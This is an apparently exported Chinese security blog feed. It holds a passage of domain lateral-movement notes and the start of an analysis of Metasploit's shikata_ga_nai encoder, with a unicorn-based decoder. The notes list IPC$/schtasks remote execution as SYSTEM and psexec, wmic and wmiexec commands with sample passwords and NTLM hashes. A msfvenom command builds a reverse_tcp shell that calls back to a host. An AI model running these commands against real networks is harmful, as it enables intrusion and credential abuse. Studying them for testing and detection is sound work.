class="string">&quot;admin!@#45&quot;</span> /user:god.org\ad</span><br><span class="line">ministrator <span class="comment"># 建立 ipc 连接：</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span> <span class="comment">#复制文件到其 C 盘</span></span><br><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">3.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /<span class="built_in">sc</span> DAILY /tr c:\add.bat /F <span class="comment">#创建 adduser 任务</span></span><br><span class="line"></span><br><span class="line">schtasks /run /s <span class="number">192.168</span>.<span class="number">3.32</span> /tn adduser /i <span class="comment">#运行 adduser 任务</span></span><br><span class="line">schtasks /delete /s <span class="number">192.168</span>.<span class="number">3.21</span> /tn adduser /f<span class="comment">#删除 adduser 任务</span></span><br></pre></td></tr></table></figure><p>IPC的常见错误代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</span><br><span class="line">（2）51：网络问题，Windows 无法找到网络路径</span><br><span class="line">（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有</span><br><span class="line">防火墙等问题</span><br><span class="line">（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</span><br><span class="line">（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</span><br><span class="line">（6）1326：账号密码错误</span><br><span class="line">（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</span><br><span class="line">（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure><p>利用SMB（445端口）服务，可以通过哈希传递或者明文传递来远程执行：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:ad</span><br><span class="line">ministrator</span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.32</span> <span class="literal">-s</span> cmd <span class="comment"># 需要先有 ipc 链接 -s 以 System 权限运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#psexec 第二种：不用建立 IPC 直接提供明文账户密码</span></span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="literal">-u</span> administrator <span class="literal">-p</span> Admin12345 <span class="literal">-s</span> cmd</span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="variable">$HASH</span><span class="variable">$</span> ./administrator@<span class="number">10.1</span>.<span class="number">2.3</span></span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="variable">$HASH</span><span class="variable">$</span> domain/administrator@<span class="number">10.1</span>.<span class="number">2.3</span></span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span></span><br></pre></td></tr></table></figure><p>还可以通过WMI服务（139端口）利用，此方法不会在目标日志系统留下痕迹：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#自带 WMIC 明文传递 无回显</span></span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">3.21</span> /user:administrator /password:Admin12345 <span class="keyword">process</span> call create <span class="string">&quot;cmd.exe /c </span></span><br><span class="line"><span class="string">ipconfig &gt;C:\1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自带 cscript 明文传递 有回显</span></span><br><span class="line">cscript //nologo wmiexec.vbs /shell <span class="number">192.168</span>.<span class="number">3.21</span> administrator Admin12345</span><br><span class="line"></span><br><span class="line"><span class="comment">#套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</span></span><br><span class="line">wmiexec ./administrator:admin!<span class="selector-tag">@</span><span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec <span class="literal">-hashes</span> :ccef208c6485269c20db2cad21734fe7 god/administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p>个人感觉还是impacket好使。</p><p>Kerberos协议：</p><ol><li><p>客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密，发送给 kdc，kdc 对用户进行检测，成功之后创建 TGT。</p></li><li><p>将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读取 kerberos 中 TGT 数据，然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测</p></li><li><p>检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将加密后的结果返回给客户机。</p></li></ol><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys代替 NT hash 来实现 ptk 攻击。</p><p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接</p><p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p><p>还有黄金票据、白银票据以及若干提权手法，遇到了再总结。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> ADCS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf-shikata_ga_nai编码分析与C2配置信息提取</title>
      <link href="2024/01/24/MSF-C2/"/>
      <url>2024/01/24/MSF-C2/</url>
      
        <content type="html"><![CDATA[<h2 id="shikata-ga-nai编码"><a href="#shikata-ga-nai编码" class="headerlink" title="shikata_ga_nai编码"></a>shikata_ga_nai编码</h2><h3 id="ELF样本"><a href="#ELF样本" class="headerlink" title="ELF样本"></a>ELF样本</h3><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><h5 id="单轮迭代"><a href="#单轮迭代" class="headerlink" title="单轮迭代"></a>单轮迭代</h5><p>在Linux平台下分析，生成一份x86下的恶意样本，其中<code>-i</code>参数指定迭代轮数，我们先迭代一轮，便于分析：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> msfvenom  -p  linux/x86/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444 -e x86/shikata_ga_nai -i 1  -f elf &gt; x86_encoder.elf</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/01/13/ztKNUhaekFjBGn4.png" alt=""></p><p>载入ida：</p><p><img src="https://s2.loli.net/2024/01/13/rX5HwLSp3UNWOyo.png" alt=""></p><p>下面还有一堆数据，应该是采用了SMC混淆。</p><blockquote><p>SMC：Self Modifying Code</p><p>即自修改代码，简而言之就是程序中的部分代码在运行前是被加密成一段数据，不可反编译，通过程序运行后执行相关解码代功能，对加密的代码数据进行解密，让其恢复正常功能。</p><p>下面是伪代码演示一种SMC的典型应用：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proc main:</span><br><span class="line">............</span><br><span class="line">IF .运行条件满足</span><br><span class="line">  CALL DecryptProc （Address of MyProc）;对某个函数代码解密</span><br><span class="line">  ........</span><br><span class="line">  CALL MyProc                           ;调用这个函数</span><br><span class="line">  ........</span><br><span class="line">  CALL EncryptProc （Address of MyProc）;再对代码进行加密，防止程序被Dump</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">end main</span><br></pre></td></tr></table></figure></blockquote><p>解混淆也比较简单，可以动态调试，或者直接dump内存。</p><p>但是都挺麻烦的，对于单个样本适用，但是如果想要自动化的一起处理多个样本就比较麻烦了。</p><p>其实可以用unicorn处理，只进行模拟解密部分的代码就可以，还不需要搭建沙箱环境。</p><p>先观察Metasploit是怎么处理这部分编码的，源码在：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb</a></p><p>核心代码如下：<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_shikata_block</span><span class="params">(state, length, cutoff)</span></span></span><br><span class="line">    <span class="comment"># 声明逻辑寄存器</span></span><br><span class="line">    count_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;ecx&#x27;</span>)</span><br><span class="line">    addr_reg  = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;addr&#x27;</span>)</span><br><span class="line">    key_reg = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果上下文编码可用，使用 mov reg, [addr]</span></span><br><span class="line">    <span class="keyword">if</span> state.context_encoding</span><br><span class="line">      key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 声明各个块</span></span><br><span class="line">    endb = Rex::Poly::SymbolicBlock::End.new</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清零计数器寄存器</span></span><br><span class="line">    clear_register = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;clear_register&#x27;</span>,</span><br><span class="line">      <span class="string">&quot;\x31\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">      <span class="string">&quot;\x29\xc9&quot;</span>,  <span class="comment"># sub ecx,ecx</span></span><br><span class="line">      <span class="string">&quot;\x33\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">      <span class="string">&quot;\x2b\xc9&quot;</span>)  <span class="comment"># sub ecx,ecx</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化计数器</span></span><br><span class="line">    init_counter = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;init_counter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将长度除以四，但确保它在块大小（4字节）边界上对齐</span></span><br><span class="line">    length += <span class="number">4</span> + (<span class="number">4</span> - (length &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line">    length /= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length &lt;= <span class="number">255</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb1&quot;</span> + [ length ].pack(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    <span class="keyword">elsif</span> (length &lt;= <span class="number">65536</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\x66\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;v&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;V&#x27;</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密钥初始化块</span></span><br><span class="line">    init_key = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果使用上下文编码，使用 mov reg, [addr]</span></span><br><span class="line">    <span class="keyword">if</span> state.context_encoding</span><br><span class="line">      init_key = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;init_key&#x27;</span>,</span><br><span class="line">        Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xa1</span> + b.regnum_of(key_reg)).chr + <span class="string">&#x27;XORK&#x27;</span>&#125;)</span><br><span class="line">    <span class="comment"># 否则，直接使用 mov reg, val</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      init_key = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;init_key&#x27;</span>,</span><br><span class="line">        Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xb8</span> + b.regnum_of(key_reg)).chr + <span class="string">&#x27;XORK&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># XOR 和 ADD 操作的处理函数</span></span><br><span class="line">    xor  = Proc.new &#123; <span class="params">|b|</span> <span class="string">&quot;\x31&quot;</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line">    add  = Proc.new &#123; <span class="params">|b|</span> <span class="string">&quot;\x03&quot;</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line"></span><br><span class="line">    sub4 = Proc.new &#123; <span class="params">|b|</span> sub_immediate(b.regnum_of(addr_reg), -<span class="number">4</span>) &#125;</span><br><span class="line">    add4 = Proc.new &#123; <span class="params">|b|</span> add_immediate(b.regnum_of(addr_reg), <span class="number">4</span>) &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (datastore[<span class="string">&quot;BufferRegister&quot;</span>])</span><br><span class="line"></span><br><span class="line">      buff_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">&#x27;buff&#x27;</span>, datastore[<span class="string">&quot;BufferRegister&quot;</span>])</span><br><span class="line">      offset = (datastore[<span class="string">&quot;BufferOffset&quot;</span>] ? datastore[<span class="string">&quot;BufferOffset&quot;</span>].to_i : <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">if</span> ((offset &lt; -<span class="number">255</span> <span class="keyword">or</span> offset &gt; <span class="number">255</span>) <span class="keyword">and</span> state.badchars.<span class="keyword">include</span>? <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        raise EncodingError.new(<span class="string">&quot;Can&#x27;t generate NULL-free decoder with a BufferOffset bigger than one byte&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      mov = Proc.new &#123; <span class="params">|b|</span></span><br><span class="line">        <span class="comment"># mov &lt;buff_reg&gt;, &lt;addr_reg&gt;</span></span><br><span class="line">        <span class="string">&quot;\x89&quot;</span> + (<span class="number">0xc0</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(buff_reg))).chr</span><br><span class="line">      &#125;</span><br><span class="line">      add_offset = Proc.new &#123; <span class="params">|b|</span> add_immediate(b.regnum_of(addr_reg), offset) &#125;</span><br><span class="line">      sub_offset = Proc.new &#123; <span class="params">|b|</span> sub_immediate(b.regnum_of(addr_reg), -offset) &#125;</span><br><span class="line"></span><br><span class="line">      getpc = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;getpc&#x27;</span>)</span><br><span class="line">      getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + add_offset.call(b) &#125;)</span><br><span class="line">      getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + sub_offset.call(b) &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 对于偏移小于四，inc 操作的大小比 add 小或相等</span></span><br><span class="line">      <span class="keyword">if</span> (offset &gt; <span class="number">0</span> <span class="keyword">and</span> offset &lt; <span class="number">4</span>)</span><br><span class="line">        getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + inc(b.regnum_of(addr_reg))*offset &#125;)</span><br><span class="line">      <span class="keyword">elsif</span> (offset &lt; <span class="number">0</span> <span class="keyword">and</span> offset &gt; -<span class="number">4</span>)</span><br><span class="line">        getpc.add_perm(Proc.new&#123; <span class="params">|b|</span> mov.call(b) + dec(b.regnum_of(addr_reg))*(-offset) &#125;)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      getpc.add_perm(Proc.new&#123; <span class="params">|b|</span></span><br><span class="line">        <span class="keyword">if</span> (offset &lt; -<span class="number">255</span> <span class="keyword">or</span> offset &gt; <span class="number">255</span>)</span><br><span class="line">          <span class="comment"># lea addr_reg, [buff_reg + DWORD offset]</span></span><br><span class="line">          <span class="comment"># 这将生成 NULL 字节</span></span><br><span class="line">          <span class="string">&quot;\x8d&quot;</span> + (<span class="number">0x80</span> + b.regnum_of(buff_reg) + (<span class="number">8</span> * b.regnum_of(addr_reg))).chr + [offset].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">        <span class="keyword">elsif</span> (offset &gt; -<span class="number">255</span> <span class="keyword">and</span> offset != <span class="number">0</span> <span class="keyword">and</span> offset &lt; <span class="number">255</span>)</span><br><span class="line">          <span class="comment"># lea addr_reg, [buff_reg + byte offset]</span></span><br><span class="line">          <span class="string">&quot;\x8d&quot;</span> + (<span class="number">0x40</span> + b.regnum_of(buff_reg) + (<span class="number">8</span> * b.regnum_of(addr_reg))).chr + [offset].pack(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="comment"># lea addr_reg, [buff_reg]</span></span><br><span class="line">          <span class="string">&quot;\x8d&quot;</span> + (b.regnum_of(buff_reg) + (<span class="number">8</span> * b.regnum_of(addr_reg))).chr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># BufferReg+BufferOffset 指向缓冲区的开头</span></span><br><span class="line">      xor1 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      xor2 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add1 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add2 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment"># FPU 块</span></span><br><span class="line">      fpu = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;fpu&#x27;</span>,</span><br><span class="line">        *fpu_instructions)</span><br><span class="line"></span><br><span class="line">      fnstenv = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;fnstenv&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;\xd9\x74\x24\xf4&quot;</span>)</span><br><span class="line">      fnstenv.depends_on(fpu)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 从堆栈上获取 EIP</span></span><br><span class="line">      getpc = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;getpc&#x27;</span>,</span><br><span class="line">        Proc.new &#123; <span class="params">|b|</span> (<span class="number">0x58</span> + b.regnum_of(addr_reg)).chr &#125;)</span><br><span class="line">      getpc.depends_on(fnstenv)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 减去 fpu 指令的偏移量，因为这是 fnstenv 之后 eip 指向的地方</span></span><br><span class="line">      xor1 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      xor2 = Proc.new &#123; <span class="params">|b|</span> xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add1 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">      add2 = Proc.new &#123; <span class="params">|b|</span> add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - <span class="number">4</span> - cutoff) ].pack(<span class="string">&#x27;c&#x27;</span>) &#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码器循环块</span></span><br><span class="line">    loop_block = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;loop_block&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    loop_block.add_perm(</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + add1.call(b) + sub4.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + sub4.call(b) + add2.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> sub4.call(b) + xor2.call(b) + add2.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + add1.call(b) + add4.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> xor1.call(b) + add4.call(b) + add2.call(b) &#125;,</span><br><span class="line">      Proc.new &#123; <span class="params">|b|</span> add4.call(b) + xor2.call(b) + add2.call(b) &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop 指令块</span></span><br><span class="line">    loop_inst = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;loop_inst&#x27;</span>,</span><br><span class="line">      <span class="string">&quot;\xe2\xf5&quot;</span>)</span><br><span class="line">      <span class="comment"># 在当前实现中，循环块的大小是常量，因此不需要进行复杂的计算。然而，这里是一种方法：</span></span><br><span class="line">      <span class="comment">#Proc.new &#123; |b|</span></span><br><span class="line">      <span class="comment">## loop &lt;loop_block label&gt;</span></span><br><span class="line">      <span class="comment">## -2 用于考虑这条指令的大小</span></span><br><span class="line">      <span class="comment">#&quot;\xe2&quot; + [ -2 - b.size_of(loop_block) ].pack(&#x27;c&#x27;)</span></span><br><span class="line">      <span class="comment">#&#125;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义块依赖关系</span></span><br><span class="line">    clear_register.depends_on(getpc)</span><br><span class="line">    init_counter.depends_on(clear_register)</span><br><span class="line">    loop_block.depends_on(init_counter, init_key)</span><br><span class="line">    loop_inst.depends_on(loop_block)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      <span class="comment"># 生成具有保存 ECX、ESP 和用户定义寄存器的排列</span></span><br><span class="line">      loop_inst.generate(block_generator_register_blacklist, <span class="literal">nil</span>, state.badchars)</span><br><span class="line">    <span class="keyword">rescue</span> RuntimeError, EncodingError =&gt; e</span><br><span class="line">      <span class="comment"># Rex::Poly 块生成器可能引发 RuntimeError 变体</span></span><br><span class="line">      raise EncodingError, e.to_s</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></p><p>其实可以发现，其生成的代码来说，有很多种组合，例如对于清空ecx就有如下四种组合：<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">clear_register = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;clear_register&#x27;</span>,</span><br><span class="line">  <span class="string">&quot;\x31\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">&quot;\x29\xc9&quot;</span>,  <span class="comment"># sub ecx,ecx</span></span><br><span class="line">  <span class="string">&quot;\x33\xc9&quot;</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">&quot;\x2b\xc9&quot;</span>)  <span class="comment"># sub ecx,ecx</span></span><br></pre></td></tr></table></figure></p><p>但是对于shikata_ga_nai编码来说，可以发现一条硬编码：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fnstenv = Rex::Poly::LogicalBlock.new(<span class="string">&#x27;fnstenv&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;\xd9\x74\x24\xf4&quot;</span>)</span><br><span class="line">      fnstenv.depends_on(fpu)</span><br></pre></td></tr></table></figure><p>这个可以作为识别shikata_ga_nai编码的重要特征，fnstenv指令用来保存 FPU 处理器的当前状态。</p><p>通过处理FPU处理器的当前状态可以很方便的获取到IP寄存器的值，由于没法直接通过<code>mov eax, eip</code>这种方法获取IP寄存器的值，可以通过FPU来获取。</p><p><img src="https://s2.loli.net/2024/01/13/X4jvlDctzoBLYwJ.png" alt=""></p><p>可以看到IP相对于FPU的偏移在12处，那么ida中经过如下指令，会将上一条浮点指令的地址最终存入edx中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08048054                 mov     ebx, 0ACAABAECh# ebx作为密钥</span><br><span class="line">LOAD:08048059                 fcmovnb st, st(2)</span><br><span class="line">LOAD:0804805B                 fnstenv byte ptr [esp-0Ch]</span><br><span class="line">LOAD:0804805F                 pop     edx</span><br></pre></td></tr></table></figure><p>然后随后的指令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08048060                 sub     ecx, ecx</span><br><span class="line">LOAD:08048062                 mov     cl, 1Fh</span><br><span class="line">LOAD:08048064                 sub     edx, 0FFFFFFFCh</span><br><span class="line">LOAD:08048067                 xor     [edx+11h], ebx</span><br><span class="line">LOAD:0804806A                 add     ebx, [edx+11h]</span><br></pre></td></tr></table></figure></p><p>会将ecx清空，然后将ecx寄存器赋值为0x1F，这个作为循环次数。</p><p>然后会将edx减去-4（其实就是edx += 4），然后会将edx的值加上一定偏移处的内存以4字节为单位和ebx寄存器的值进行异或，随后动态的更新ebx的值。</p><p>其实ebx的值就是作为异或的密钥，不过不是一成不变的，而是动态更新的，每次都会加上一定的值进行密钥更新。</p><p>那么可以用unicorn模拟程序执行进行解密，核心代码如下，其中反汇编引擎可以采用capstone，实测比pwntools的disasm效果要好：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span>  </span><br><span class="line">    eip = mu.reg_read(UC_X86_REG_EIP)</span><br><span class="line">    <span class="keyword">global</span> secret</span><br><span class="line">    <span class="keyword">if</span> eip == <span class="number">0x08048059</span>: </span><br><span class="line">        <span class="comment"># 获取秘钥</span></span><br><span class="line">        secret = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        print(<span class="string">&#x27;secret key:&#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> eip == <span class="number">0x08048067</span>:</span><br><span class="line">        ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        print(<span class="string">&#x27;ecx:&#x27;</span> + <span class="built_in">hex</span>(ecx))</span><br><span class="line">        print(<span class="string">&#x27;edx:&#x27;</span> + <span class="built_in">hex</span>(edx))</span><br><span class="line">        <span class="comment"># 记忆化存储最开始的edx的值</span></span><br><span class="line">        memorize_start_edx = edx</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ecx):</span><br><span class="line">            <span class="comment"># 获取[edx+11h]的四个字节</span></span><br><span class="line">            mem_data = mu.mem_read(edx + <span class="number">0x11</span>, <span class="number">4</span>)</span><br><span class="line">            mem_value = u32(mem_data)</span><br><span class="line">            <span class="comment"># 解密处理</span></span><br><span class="line">            result = mem_value ^ secret</span><br><span class="line">            <span class="comment"># 写回内存</span></span><br><span class="line">            mu.mem_write(edx + <span class="number">0x11</span>, p32(result))</span><br><span class="line">            <span class="comment"># 动态秘钥更新</span></span><br><span class="line">            secret += u32(mu.mem_read(edx + <span class="number">0x11</span>, <span class="number">0x4</span>)) </span><br><span class="line">            secret = secret &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            edx += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">        code = mu.mem_read(memorize_start_edx + <span class="number">0x11</span>, <span class="number">0x100</span>)</span><br><span class="line">        code = code.rstrip(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        disassemble_mem(code, <span class="number">0x0</span>)</span><br><span class="line">        mu.emu_stop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(<span class="number">0x8048054</span>, <span class="number">0x8048054</span> + <span class="number">0x200</span>)</span><br></pre></td></tr></table></figure><p>运行如下：<br><img src="https://s2.loli.net/2024/01/13/K5PaEsbCAovgLGW.png" alt=""></p><p>gdb动态调试解密后代码如下：</p><p><img src="https://s2.loli.net/2024/01/13/zFjQPoSRZAGDi3X.png" alt=""></p><p>可以发现最终得到了解密后的代码，关于C2配置提取，则同无编码的样本一样。</p><p>至此可以得到1轮迭代后的样本了，下面来分析多轮迭代后的样本。</p><h5 id="多轮迭代"><a href="#多轮迭代" class="headerlink" 